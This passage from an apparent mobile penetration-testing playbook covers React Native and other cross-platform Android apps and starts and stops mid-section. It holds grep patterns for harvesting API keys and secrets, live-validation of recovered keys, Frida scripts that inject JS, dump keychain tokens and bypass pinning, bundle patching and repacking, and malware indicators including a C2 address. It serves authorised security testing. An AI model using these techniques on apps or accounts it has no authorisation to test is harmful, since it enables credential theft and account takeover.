| **Attacker** | AM-01 remote no interaction (once you hold a route and a token) |
| **Applies to** | all cross-platform frameworks |
| **Maps to** | MASTG-TOOL-0125 (apkleaks); hermes-decomp `strings`/`secrets` |

- **Test:** Traffic observation only reveals the endpoints the UI happens to exercise. The bundle or
  snapshot contains the *full* client-side API surface, including admin, debug and feature-flagged routes
  that no amount of clicking will surface. This is where cross-platform apps most often hide unauthenticated
  administrative functionality.
- **How:**
  ```bash
  # React Native
  grep -aoE 'https?://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+' hbc.strings | sort -u >  endpoints.txt
  grep -aoE '["'\''`]/(api|v[0-9]+|graphql|internal|admin)[A-Za-z0-9._/{}$-]*' hbc.strings | sort -u >> endpoints.txt
  # Flutter
  grep -aoE 'https?://[^ "]+|/(api|v[0-9]+)/[A-Za-z0-9._/{}-]+' out_dir/pp.txt | sort -u >> endpoints.txt
  # Unity / Xamarin
  grep -aoE 'https?://[^ "]+' out/dump.cs out/assemblies/out/*.dll | sort -u >> endpoints.txt
  # Cordova / Capacitor
  grep -rnoE 'https?://[A-Za-z0-9._/-]+' out/assets/{www,public} | sed 's/.*://' | sort -u >> endpoints.txt
  sort -u endpoints.txt | grep -viE 'schema|w3\.org|github|npmjs|example\.com' > endpoints.final
  wc -l endpoints.final
  ```
  Then replay each with your own session and with a second controlled account's identifiers, following the
  unauthenticated-sweep taxonomy in -> D15.
- **Proof:** A 200 from an endpoint the UI never calls, returning a second controlled account's data,
  captured as a request/response pair with a unique marker planted in the victim account (see D19-077).
- **Escalation:** -> D15 for the full IDOR/BOLA/mass-assignment pass; -> D19-073 for the version-diff that
  usually makes the mobile route weaker than the web one.
- **Ruled out when:** Every route in `endpoints.final` either 401s without a token and 403s with a
  second-account token, or is a third-party/static-asset host. Record the count tested and the rejection
  shape — a documented control response (D15) is what makes the negative defensible.

### D19-012 · Validate every bundle-resident credential against the live service before reporting it

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `.for_internal_asset` (P3) when the asset is not publicly reachable |
| **Attacker** | AM-01 |
| **Applies to** | React Native, Cordova/Ionic/Capacitor, and any framework that ships a JS/web bundle |
| **Maps to** | MASWE-0004 (CWE-798), MASTG-TECH-0019, MASTG-TOOL-0125 (apkleaks), MASTG-TOOL-0144 (gitleaks); hermes-decomp `secrets` |

- **Test:** RN and Ionic apps routinely embed keys that are "public" by the vendor's framing but privileged
  in practice — Firebase server keys, Algolia admin keys, unrestricted Google Maps/billing keys, Stripe
  secret keys, static bearers. A key-shaped string is not a finding; a key that authenticates is.
- **How:**
  ```bash
  grep -aoE 'AIza[0-9A-Za-z_-]{35}'                    hbc.strings | sort -u
  grep -aoE '(sk|rk)_(live|test)_[0-9A-Za-z]{16,}'     hbc.strings | sort -u
  grep -aoE 'AKIA[0-9A-Z]{16}'                         hbc.strings | sort -u
  grep -aoE 'xox[baprs]-[0-9A-Za-z-]{10,}'             hbc.strings | sort -u
  grep -aiE 'secret|token|apikey|api_key|password|private_key|client_secret|jwt|admin.?key|master.?key|service.?account' hbc.strings
  gitleaks detect --no-git --source ./decompiled/
  hermes-decomp secrets ext/assets/index.android.bundle
  # then validate, per service — never report a match alone:
  curl -s -o /dev/null -w '%{http_code}\n' "https://<service-endpoint>" -H "Authorization: <key>"
  ```
- **Proof:** A live, authorised HTTP response produced by the recovered key from a clean host with no
  device involved, captured as a request/response pair. Mask the key body in the report but leave the
  trace/request id and the JSON key names visible so the triager can correlate against their own logs.
- **Escalation:** -> D18 third-party account abuse; a signing/HMAC secret -> D12 and offline request forgery;
  a static bearer -> D15 as an authentication bypass.
- **Ruled out when:** Each candidate returns 401/403 from its service, or is demonstrably a public
  identifier with server-side restriction in force (a Firebase `apiKey` with locked-down security rules — but
  prove the rules, see -> D18). Note the standing exception: an **OAuth `client_secret` in a mobile app is
  never-submit** — it is known and expected. The reportable sibling is PKCE non-enforcement (-> D13).

### D19-013 · Source map shipped in the APK or fetchable from the update host

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when the recovered source names internal hosts or unreleased functionality; Low/Informational when it only removes reversing friction |
| **Attacker** | AM-01 |
| **Applies to** | React Native; equally Cordova/Ionic/Capacitor web bundles |
| **Maps to** | MASTG-TECH-0019 |

- **Test:** An `index.android.bundle.map`, or a map reachable on the CDN/OTA host, collapses the whole static
  analysis problem to reading original TypeScript/JSX with comments and internal endpoint names.
- **How:**
  ```bash
  unzip -l target.apk | grep -iE '\.map$|sourcemap'
  find out/assets -name '*.map' -o -name '*.js.map'
  grep -a -oE 'sourceMappingURL=[^ ]+' ext/assets/index.android.bundle
  # try the OTA/CDN host next to the bundle path you found in D19-025:
  curl -sI "https://<update-host>/<path>/index.android.bundle.map" | head -1
  curl -s  "https://<update-host>/<path>/index.android.bundle.map" | python3 -c \
    "import json,sys;m=json.load(sys.stdin);print(len(m.get('sourcesContent',[])),'sources');print(m['sources'][:20])"
  ```
- **Proof:** A `.map` returning HTTP 200 with a populated `sourcesContent` array containing original source,
  quoted with a file path that is clearly first-party.
- **Escalation:** Recovered source is the fastest route to D19-011 (endpoints), D19-012 (secrets) and
  D19-074 (client-side constraints to test server-side).
- **Ruled out when:** No `.map` in any split, no `sourceMappingURL` comment in the bundle, and the
  conventional map URL next to every bundle path you know returns 403/404. A map behind authentication on a
  developer-only host is out of scope unless the program says otherwise.

### D19-014 · Enumerate Metro module boundaries — a JS SBOM no DEX-based SCA produces

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | n/a as inventory; the finding is whatever the reachable vulnerable package yields |
| **Attacker** | AM-08 |
| **Applies to** | React Native (Metro), both Hermes and plain-JS bundles |
| **Maps to** | hermes-decomp README (`modules`, `deps`, `extract`); react-native-decompiler README (`--unpackOnly`) |

- **Test:** A Metro bundle is a map of numbered modules (`__d(factory, moduleId, deps)`). Recovering that map
  gives a de-facto SBOM for the JS half of the app — including abandoned or vulnerable npm packages that a
  Maven-side SBOM or an APK SCA scan will never see, because the mobile production artefact is DEX plus
  native code and contains no npm metadata.
- **How:**
  ```bash
  hermes-decomp modules ext/assets/index.android.bundle
  hermes-decomp deps    ext/assets/index.android.bundle
  strings -a ext/assets/index.android.bundle | grep -aoE 'node_modules/(@[a-z0-9._-]+/)?[a-z0-9._-]+' | sort -u
  strings -a ext/assets/index.android.bundle | grep -aoE '"version":"[0-9]+\.[0-9]+\.[0-9]+"' | sort -u
  npx react-native-decompiler -i ext/assets/index.android.bundle -o ./output --unpackOnly
  grep -rl "react-native-" output/ | sed 's#.*/##' | sort -u
  # native halves of RN packages:
  unzip -l target.apk | grep -E 'lib/.*(reanimated|hermes|jsc|rnscreens|fbjni)'
  ```
- **Proof:** A list of `node_modules/<pkg>` paths recovered from the bundle, cross-checked against the
  repository's `package-lock.json` where you have it — a package present in the bundle but absent from the
  lockfile is an undeclared dependency and a finding in its own right.
- **Escalation:** Feed the names to `osv-scanner`; a vulnerable `react-native-webview` version chains
  straight into -> D10; a vulnerable crypto/storage module into -> D11/D12. -> D19-015 for the named cases.
- **Ruled out when:** The module map resolves cleanly, every package name maps to a lockfile entry at a
  version with no matching OSV advisory, **and** you have checked reachability — an advisory against a
  package that is bundled but never required by any reachable module is Informational, so say which.

### D19-015 · Vulnerable and malicious npm packages in the React Native dependency set

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for the developer/CI compromise outcome; `broken_access_control.idor.*` or per-sink for the vulnerable-library outcome |
| **Attacker** | AM-08 malicious third-party SDK (the package), AM-03/AM-04 for the on-device path-traversal case |
| **Applies to** | React Native projects; the malicious-release half applies to the app repo **and every developer/CI host** |
| **Maps to** | **CVE-2024-21668** (`react-native-mmkv` Android before 2.11.0 logged the optional encryption key to Android logs); `react-native-document-picker` **< 9.1.1** path traversal on Android file selection, fixed in 9.1.1 |

- **Test:** Two distinct classes. (a) A shipped library version with a known defect whose impact you can
  demonstrate on-device. (b) A compromised npm release that executed on a build host.
- **How:**
  ```bash
  # (a) shipped-library versions, from the bundle or the lockfile
  grep -a -n "react-native-mmkv"           hbc.strings *.map 2>/dev/null
  grep -a -n "react-native-document-picker" hbc.strings *.map 2>/dev/null
  grep -nE '"react-native-mmkv"|"react-native-document-picker"' package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null
  # CVE-2024-21668 impact proof — the key ends up in logcat:
  adb logcat -c && adb shell monkey -p <pkg> 1 && adb logcat -d | grep -aiE 'mmkv|encryptionKey'

  # (b) known-malicious releases
  grep -nE '"react-native-international-phone-number"|"react-native-country-select"|@agnoliaarisian7180/string-argv|@usebioerhold8733/s-format|@react-native-aria/focus' \
       package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null
  ls -l ~/init.json 2>/dev/null && echo "MALWARE EXECUTION MARKER PRESENT"
  find node_modules -name 'child.js' -size -2k 2>/dev/null
  grep -rn '"preinstall"\|"postinstall"' node_modules/*/package.json node_modules/@*/*/package.json 2>/dev/null | head -40
  grep -rE '45\.32\.150\.251|api\.mainnet-beta\.solana\.com|rpc\.ankr\.com/solana|solana-rpc\.publicnode\.com' /var/log/* 2>/dev/null
  ```
  Known-bad versions from this research: `react-native-international-phone-number` **0.11.8, 0.12.1, 0.12.2,
  0.12.3** (last safe 0.11.7) and `react-native-country-select` **0.3.91, 0.4.1, 0.4.2** (last safe 0.4.0),
  with payload relays `@agnoliaarisian7180/string-argv` (0.3.0, 0.3.1) and `@usebioerhold8733/s-format`
  (2.0.1–2.0.4); the chain used a `preinstall` hook running an obfuscated `install.js`, then a `postinstall`
  hook launching a 364-byte `child.js` as a detached child, with a 10-second sandbox-evasion delay,
  geolocation filtering, Solana-blockchain C2 polling, payload fetch from `http://45.32.150.251` decrypted
  from the `secretkey`/`ivbase64` HTTP headers, in-memory `eval()`/`vm.Script` execution and a `~/init.json`
  48-hour rate-limit lock. A separate 2025-06 incident backdoored 16 React Native / GlueStack packages with
  whitespace-obfuscated code and a RAT supporting arbitrary command execution, exfiltration and persistent
  C2, beginning with `@react-native-aria/focus@0.2.10`.
- **Proof:** For (a), the vulnerable version present **plus** the demonstrated impact — the MMKV encryption
  key visible in a logcat capture, or a traversal path accepted by the document picker. For (b), a lockfile
  pin on a named bad version, the presence of `~/init.json`, or egress logs to the named C2.
- **Escalation:** (a) MMKV key in logs -> D11 (anyone with `READ_LOGS`, a bug report, or ADB reads it) ->
  local vault decryption. (b) CI compromise -> a trojanised, correctly signed release -> D17.
- **Ruled out when:** The pinned versions are at or above the fixed lines (`react-native-mmkv` ≥ 2.11.0,
  `react-native-document-picker` ≥ 9.1.1), no named bad version appears in any lockfile, and no execution
  marker is present on the hosts in scope. For (a) also note that a vulnerable version with the affected
  feature never invoked is Informational — check reachability before rating.

### D19-016 · `@react-native-community/cli` dev-server RCE (CVE-2025-11953) — scope it to the build environment

| | |
|---|---|
| **Severity ceiling** | Critical (build environment only — **not** an end-user-device finding) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) against the developer/CI host, where that host is in scope |
| **Attacker** | AM-06 network attacker on the developer/CI network |
| **Applies to** | React Native build environments where the repo or CI is in scope; patched by Meta in **version 20.0.0** |
| **Maps to** | **CVE-2025-11953** — `@react-native-community/cli`, CVSS **9.8**, unauthenticated attackers execute arbitrary OS commands via the package's development server |

- **Test:** The CLI exposed an unauthenticated OS-command path through its development server. The exposure
  is the build host, not the shipped app — get the scoping right or the report is invalid.
- **How:**
  ```bash
  grep -n '"@react-native-community/cli"' package.json package-lock.json
  npm ls @react-native-community/cli
  # is a dev server listening beyond loopback during builds/CI?
  lsof -nP -iTCP:8081 -sTCP:LISTEN
  ```
- **Proof:** A pinned CLI version below 20.0.0 while a Metro/dev server listens on `0.0.0.0:8081` on a host
  within the engagement scope.
- **Escalation:** Dev-host RCE -> source, signing-key and token theft -> a trojanised signed release
  (-> D17).
- **Ruled out when:** The pinned version is ≥ 20.0.0, or the repository/CI is explicitly out of scope. Where
  the version is vulnerable but the dev server only ever binds `127.0.0.1`, state the reduced exposure rather
  than claiming the CVSS 9.8 vector.

### D19-017 · React Native dev support, Metro bundle server and dev activities in the shipped build

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null) for the state-only variant |
| **Attacker** | AM-06 network attacker (serves the bundle); AM-03 zero-permission local app (sets `debug_http_host`, launches the dev activity) |
| **Applies to** | React Native release builds that still ship `DevSupportManager` wiring |
| **Maps to** | React Native `devsupport/DevServerHelper.kt` (bundle URL format `"%s://%s/%s.%s?platform=android&dev=%s&lazy=%s&minify=%s&app=%s&modulesOnly=%s&runModule=%s"`, inspector device URL `"%s://%s/inspector/device?name=%s&app=%s&device=%s&profiling=%b"`, `"%s://%s/open-debugger?device=%s"`); MASTG-TECH-0160 (Enumerating Activities) |

- **Test:** RN's dev support fetches the JS bundle over plain HTTP from a packager host and exposes inspector
  endpoints. If any of that survives into release — or if a dev/settings activity remains exported — the app
  will execute JavaScript from whatever host it is pointed at, with the app's full native-module surface.
- **How:**
  ```bash
  grep -a -nE 'packager|:8081|/index\.bundle|/open-debugger|/inspector/device|debuggerHost|DevSettings|DEV_SUPPORT|getUseDeveloperSupport|BundleDownloader|packagerHost' hbc.strings
  grep -rn 'DevSupportManager\|getUseDeveloperSupport\|BundleDownloader\|packagerHost' out/sources out/smali/ | head
  grep -nE 'android:exported="true"' out/AndroidManifest.xml | grep -iE 'dev|debug|inspector|test|playground'
  adb shell dumpsys package <pkg> | grep -iE 'devsupport|DevSettings|Inspector'
  adb shell cat /data/data/<pkg>/shared_prefs/*.xml | grep -i debug_http_host
  adb shell am start -n <pkg>/com.facebook.react.devsupport.DevSettingsActivity
  adb logcat | grep -iE 'ReactNative|DevServer|packager'
  ```
  Forcing the flag at runtime (only report it if it actually works — in a properly built release
  `DevSupportManagerImpl` is stripped and this crashes or no-ops):
  ```javascript
  // frida -U -f <pkg> -l enable-dev.js
  Java.perform(function () {
    try {
      var Host = Java.use('com.facebook.react.ReactNativeHost');
      Host.getUseDeveloperSupport.implementation = function () { return true; };
      console.log('[+] Patched ReactNativeHost.getUseDeveloperSupport');
    } catch (e) { console.log('[-] Could not patch: ' + e); }
  });
  ```
- **Proof:** The app issuing a request to `http://<host>:8081/index.bundle?platform=android&dev=true&...`
  from a **store-signed** build (record `apksigner verify --print-certs` to prove it), or the dev menu opening
  on that build, or a reachable `/open-debugger` / `/inspector/device` endpoint. Also check whether **Flipper**
  was accidentally bundled into release — its Network plugin exposes requests and responses directly.
- **Escalation:** Owns the whole client: attacker-supplied JS runs with every native module the app
  registers (-> D19-018) and every stored credential (-> D11).
- **Ruled out when:** The release build contains no `DevSupportManager`/`DevServerHelper` classes (confirm in
  the DEX, not just the bundle), the dev activity is absent or `exported="false"`, the Frida flag-flip throws
  `ClassNotFoundException`, and no `:8081` traffic appears on a full app walkthrough with a packet capture
  running. A crash after the flag flip is a negative, not a finding.

### D19-018 · Enumerate the React Native native-module surface and invoke it from injected JS

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when a module returns the live session/keychain material; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a returned secret; otherwise rate by the capability reached |
| **Attacker** | AM-09 (an OTA bundle chooses the calls) / AM-02 (a WebView `postMessage` routed into a module) |
| **Applies to** | React Native, both the old batched bridge and — with `global.__turboModuleProxy` substituted — the new architecture |
| **Maps to** | ATT&CK T1575 (Native API), T1407; MASWE-0033 |

- **Test:** RN's bridge exposes every registered native module to JS. Enumerate the registry, then rate the
  bridge **by what each method returns**, not by counting modules — and check whether the native side does
  its own authorisation, because it generally assumes the JS caller is trusted.
- **How:**
  ```bash
  grep -rnE 'ReactContextBaseJavaModule|@ReactMethod|createNativeModules|ReactPackage|getName\(\)' out/sources | head -60
  grep -a -oE 'NativeModules\.[A-Za-z0-9_]+' hbc.strings | sort -u
  grep -rniE 'keychain|securestore|EncryptedSharedPreferences|MasterKey|MMKV|AsyncStorage|preferences_pb' out/sources | head
  ```
  Then enumerate and call them live, from inside the app's own JS runtime:
  ```javascript
  // hook.js — loaded via the CatalystInstanceImpl trick in D19-020
  console.log(Object.keys(this.nativeModuleProxy || {}));
  const mq = this.__fbBatchedBridge;                    // new architecture: global.__turboModuleProxy
  const orig = mq.callFunctionReturnFlushedQueue.bind(mq);
  mq.callFunctionReturnFlushedQueue = function () {
    console.log('[bridge]', JSON.stringify(arguments)); return orig.apply(null, arguments);
  };
  // call a candidate directly and print what it hands back:
  this.nativeModuleProxy.RNKeychainManager
    .getGenericPasswordForOptions({ service: '<service>' })
    .then(r => console.log('[keychain]', JSON.stringify(r)));
  ```
- **Proof:** A printed module list plus, for one candidate, a successful direct invocation returning
  privileged data — a keychain/secure-storage module handing a token to script you injected, a file module
  returning app-private bytes, a crypto module signing with the app's key.
- **Escalation:** A token-returning module reached from an unsigned OTA bundle (D19-026/D19-027) or from a
  WebView `postMessage` handler (D19-022) is the chain that turns a "JS-layer" issue into a P1 -> D15 replay
  -> account takeover.
- **Ruled out when:** Every registered module is UI/analytics/navigation shaped, no method returns
  credential, file or crypto material, and the modules that do exist re-derive authorisation natively
  (verify by calling them from injected JS and observing the native rejection, not by reading the Java).

### D19-019 · React Native static-analysis false negatives: module naming and `getConstants()` timing

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (retraction prevention) |
| **Attacker** | n/a |
| **Applies to** | React Native |
| **Maps to** | n/a (method; the worked retraction is recorded below) |

- **Test:** Two specific ways an RN review produces a confident wrong negative. (1) **The JS-visible module
  name is not the Java class name** — resolve the mapping before asserting a module is absent or stubbed.
  (2) **`getConstants()` runs once at module construction**, so anything delivered later (for example via
  `onNewIntent`) will not appear there, and a zero reading is not evidence the app never reads that value.
  Related: settings applied by a framework WebView wrapper never match a `setAllowUniversalAccessFromFileURLs(true)`
  style grep, because `android.webkit.WebSettings` is abstract and the concrete class is
  `com.android.webview.chromium.ContentSettingsAdapter`.
- **How:**
  ```bash
  grep -rn 'createNativeModules\|ReactPackage\|@Provides\|@Binds' out/sources
  grep -rn 'getName()' out/sources -A3 | grep -B1 'return "'      # JS name <- Java class mapping
  ```
  For (2), either invoke the underlying parse method directly, or cold-start the app with the data present:
  ```bash
  adb shell am force-stop <pkg>
  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<payload>" <pkg>   # data present at construction
  ```
- **Proof:** The mapping written out explicitly in your notes — the worked retraction from this corpus is
  that `com.oblador.keychain.KeychainModule` is exposed to JS as `RNKeychainManager`, and a report that read
  only the stub module was wrong despite accurate citations. For (2), the value appearing once you invoke
  the parse path directly.
- **Escalation:** Prevents both a false negative in D19-018 and a false positive in a "the app never reads
  that" claim.
- **Ruled out when:** You have listed every `ReactPackage.createNativeModules` return value with its
  `getName()` string, and exercised the data-delivery path at cold start. Then a zero is a real zero.

### D19-020 · Load your own JS into the running RN app and intercept XHR above TLS

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (harness; it converts a "pinned, untestable" app into a fully testable one) |
| **Attacker** | AM-12 own rooted device — **not an attack** |
| **Applies to** | React Native (old bridge). On the new architecture hook `global.__turboModuleProxy` instead |
| **Maps to** | MASTG-TOOL-0001 (Frida Android), MASTG-TECH-0041 (Library Injection) |

- **Test:** Injecting a second script at `loadScriptFromAssets` time gives you a live JS console inside the
  app's own runtime — the most productive RN testing position there is, and it is entirely independent of
  TLS, so pinning stops mattering.
- **How:**
  ```bash
  adb push hook.js /data/local/tmp/hook.js
  adb shell "run-as <pkg> cp /data/local/tmp/hook.js files/hook.js" 2>/dev/null || \
    adb shell su -c "cp /data/local/tmp/hook.js /data/data/<pkg>/files/hook.js && chown <uid>:<uid> /data/data/<pkg>/files/hook.js"
  frida -U -f <pkg> -l inject-bundle.js --no-pause
  ```
  ```javascript
  // inject-bundle.js
  Java.perform(function () {
    var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
    C.loadScriptFromAssets.implementation = function (am, url, z) {
      this.loadScriptFromAssets(am, url, z);
      this.loadScriptFromFile('/data/data/<pkg>/files/hook.js','/data/data/<pkg>/files/hook.js', z);
    };
  });
  ```
  ```javascript
  // hook.js — full plaintext request/response logging, TLS-independent
  this.XMLHttpRequest._interceptor = {
    requestSent:      (id, url, method, headers) => console.log('REQ', id, method, url, JSON.stringify(headers)),
    responseReceived: (id, url, status, h)       => console.log('RES', id, status, url),
    dataReceived:     (id, data)                 => console.log('DATA', id, data)
  };
  const _s = JSON.stringify;
  JSON.stringify = function () { const r = _s.apply(this, arguments); console.log('[json]', r); return r; };
  ```
  Inside `hook.js` you have `this.process`, `XMLHttpRequest`, `fetch`, `WebSocket`, `FormData`, and the Metro
  module system (`__r`, `__d`, `__c`) — so `__r(<moduleId>)` reaches the app's own modules.
- **Proof:** `hook.js` output in logcat naming real modules, and complete plaintext request/response pairs
  logged with pinning still enabled.
- **Escalation:** Unblocks the whole of -> D15 for a pinned RN app without ever touching TLS; feeds D19-018.
  Caveat from the source author: React component props could not be overridden this way.
- **Ruled out when:** `CatalystInstanceImpl` is absent (new architecture — use `global.__turboModuleProxy`),
  or the app refuses to start under Frida. Neither is a finding: the app detecting Frida is a P5 resilience
  observation (see the Graveyard).

### D19-021 · Patch a Hermes string, reassemble, and prove the bundle carries no integrity control

| | |
|---|---|
| **Severity ceiling** | Medium (standalone); High when the patched path bypasses a paywall, licence or client-side authorisation gate the server does not re-verify |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (P5) standalone — **do not file it there**; file the unlocked control (e.g. `broken_access_control.privilege_escalation`, null) |
| **Attacker** | AM-12 own rooted device for the demonstration; the real attacker is AM-09 via the OTA path |
| **Applies to** | React Native. `hbctool` reassembly is **LEGACY** (HBC ≤ 76); on newer bundles patch a string in place or inject a gadget instead |
| **Maps to** | MASTG-TOOL-0011 (Apktool), MASTG-TOOL-0103 (uber-apk-signer); hermes-decomp `patch-string`, `asm`, `emit-hasm` |

- **Test:** Replace or edit the bundle, re-sign, install, and confirm the app runs attacker-controlled JS.
  This converts "the bundle is obfuscated" into a demonstrated integrity failure with a working artefact.
  On HBC versions no assembler supports, rewriting a single string (an API host, a feature-flag key, a
  `__DEV__`-style sentinel) is far cheaper than reassembly and is enough for most PoCs.
- **How:**
  ```bash
  apktool d target.apk -o out/
  # HBC <= 76 — full round trip:
  hbctool disasm out/assets/index.android.bundle hasm/
  #   edit hasm/instruction.hasm: flip a StrictEqual/Greater/Less, change a LoadConstUInt8 0 -> 1,
  #   retarget a conditional jump, or swap a string operand
  hbctool asm hasm/ out/assets/index.android.bundle
  # Modern HBC — patch a string in place instead:
  hermes-decomp patch-string out/assets/index.android.bundle --help
  # repack and re-sign
  rm -rf out/META-INF
  apktool b out/ -o repacked.apk
  java -jar uber-apk-signer.jar --apks repacked.apk
  adb install -r repacked-aligned-debugSigned.apk
  ```
  Alternatives when `hbctool` refuses the version: `hasmer disasm ./index.android.bundle -o hasm_out`;
  `hermes_rs` for HBC 76/89/90/93/94/95/96 (binary assembler, no textual form).
- **Proof:** The patched behaviour observably changing on device — a gated screen unlocking, a threshold check
  passing at a value it previously rejected, or the app issuing its normal API calls to your host after the
  base URL string was repointed — captured on screen plus in logcat.
- **Escalation:** A working repack is the delivery vehicle for gadget injection (D19-043), bundle-level bridge
  logging (D19-020) and the OTA-substitution PoCs (D19-026/D19-027). The redirected-traffic variant escalates
  into a data-exposure finding by showing what the app sends (credentials, tokens) -> D14/D15.
- **Ruled out when:** The repacked, re-signed APK is rejected at install or fails at launch with a signature
  or integrity error the app itself raises (check logcat for the app's own tamper message, not the platform's
  `INSTALL_PARSE_FAILED_*`), **and** the check is not implemented in the patchable layer (see D19-078 —
  a signature check written in JS/Dart/C# is itself patchable and therefore not a control).

### D19-022 · `react-native-webview`: bridge props, `injectedJavaScriptObject`, and the media auto-grant

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when `injectedJavaScriptObject` carries a session token into a page that can be navigated off-origin; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) for the covert camera/mic case |
| **Attacker** | AM-02 remote one-click |
| **Applies to** | React Native apps using `react-native-webview`; the media half also applies to Unity apps using `unity-webview` |
| **Maps to** | `RNCWebView.java` (`JAVASCRIPT_INTERFACE = "ReactNativeWebView"`, `addJavascriptInterface(fallbackBridge, JAVASCRIPT_INTERFACE)`, the injected `window.ReactNativeWebView.injectedObjectJson` shim); `RNCWebViewManager.kt` (`@ReactProp` setters and the `settings.setSupportMultipleWindows(true)` / `allowUniversalAccessFromFileURLs = false` defaults); MASWE-0033, MASWE-0035 |

- **Test:** `react-native-webview` installs a JS interface named `ReactNativeWebView` with `postMessage`, and
  exposes props that can re-enable dangerous WebView settings. Check which props the app actually sets — the
  library's default `allowUniversalAccessFromFileURLs = false` is safe, so the finding is the app
  **overriding** it. Separately, published research identified a media-permission auto-grant in both
  `react-native-webview` and `unity-webview` where neither plugin offered any way for the host app to deny
  WebView media access.
- **How:**
  ```bash
  for p in allowFileAccess allowFileAccessFromFileURLs allowUniversalAccessFromFileURLs \
           mixedContentMode originWhitelist injectedJavaScript injectedJavaScriptBeforeContentLoaded \
           injectedJavaScriptObject setSupportMultipleWindows javaScriptEnabled \
           webContentsDebuggingEnabled; do
    printf '%-40s %s\n' "$p" "$(grep -a -c "$p" hbc.strings)"; done
  hermes-decomp xref ext/assets/index.android.bundle --query 'injectedJavaScript'
  grep -rn "ReactNativeWebView\|unity-webview\|UNITYWEBVIEW_ANDROID_ENABLE_CAMERA\|UNITYWEBVIEW_ANDROID_ENABLE_MICROPHONE" out/
  ```
  ```javascript
  // inside the WebView (chrome://inspect, or a page you got loaded):
  typeof window.ReactNativeWebView;
  window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'getToken' }));
  window.ReactNativeWebView.injectedObjectJson();       // returns whatever injectedJavaScriptObject holds
  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(s => console.log('MEDIA GRANTED', s.getTracks().map(t => t.kind)));
  ```
- **Proof:** `injectedObjectJson()` returning a session token, or the app's `onMessage` handler consuming the
  posted string without validation (`JSON.parse(e.nativeEvent.data)` then dispatching by a `type` field into
  native module calls) — traced from the bundle. For the media case: tracks acquired with no prompt while the
  host app holds `CAMERA`/`RECORD_AUDIO`.
- **Escalation:** `postMessage` into a privileged native module -> D19-018 -> D11/D12; deep link that loads
  your page into that WebView -> D09; covert recording -> D20.
- **Ruled out when:** The WebView's `originWhitelist` is a concrete first-party list you cannot escape (test
  a redirect chain, not just a direct load), `injectedJavaScriptObject` is unset or carries no credential,
  the `onMessage` handler validates `e.nativeEvent.url` against the same allow-list before dispatching, and
  the app does not hold `CAMERA`/`RECORD_AUDIO`. State each of the four explicitly.

### D19-023 · React Native certificate pinning implemented only in JavaScript

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` (**P5**) — never file this as a finding |
| **Attacker** | AM-06/AM-07 |
| **Applies to** | React Native apps pinning via a JS-side library rather than a native config |
| **Maps to** | mobsfscan `android_certificate_pinning` (patterns include `import com.toyberman.RNSslPinningPackage;`) and `android_safetynet_api` (`new RNGoogleSafetyNetPackage(...)`) |

- **Test:** When pinning lives in a JS library rather than a Network Security Config or an OkHttp
  `CertificatePinner`, it is removable by editing the bundle. Establish which layer implements it, because
  that changes the remediation, not the severity.
- **How:**
  ```bash
  grep -a -n 'react-native-ssl-pinning\|RNSslPinningPackage\|com\.toyberman\|RNGoogleSafetyNetPackage' hbc.strings
  grep -rn 'RNSslPinningPackage\|com.toyberman\|CertificatePinner\|networkSecurityConfig' out/sources out/AndroidManifest.xml
  ```
  Then replace the pinning call with a no-op and repack per D19-021, or simply use the XHR interceptor in
  D19-020 which bypasses TLS entirely.
- **Proof:** Traffic decrypting through your proxy after the no-op patch, with the pinning call site quoted
  from the bundle.
- **Escalation:** The bypass is **not** the report. Report what the now-visible traffic reveals — tokens in
  URLs, unauthenticated endpoints, IDOR (-> D14/D15). Without that, this belongs in the Graveyard.
- **Ruled out when:** Pinning is enforced in the Network Security Config or natively in OkHttp/Conscrypt and
  the JS layer only mirrors it — in which case say so and move to the traffic findings anyway.

### D19-024 · Read the framework's storage backend using the key names you already mined

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) as filed — the reportable form is the token replay: `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-11 physical unlocked / AM-12 own device for the read; AM-09 via the bridge primitives for the remote form |
| **Applies to** | all cross-platform frameworks |
| **Maps to** | MASTG-TECH-0142 (Inspecting WebView Storage) for the Cordova/Capacitor stores |

- **Test:** Each framework has a default key/value store in a predictable file. Because the *key names* are
  already in your bundle/snapshot string dump, this is a targeted read rather than a fishing trip — and the
  finding is never "the file is unencrypted" (P5) but the replay of what you found.
- **How:**
  ```bash
  # React Native AsyncStorage (SQLite):
  adb exec-out run-as <pkg> cat databases/RKStorage > RKStorage.db
  sqlite3 RKStorage.db 'select key, substr(value,1,400) from catalystLocalStorage;'
  adb shell "run-as <pkg> ls -la files/mmkv/"                              # react-native-mmkv
  # Capacitor / Cordova:
  adb shell "run-as <pkg> cat shared_prefs/CapacitorStorage.xml"
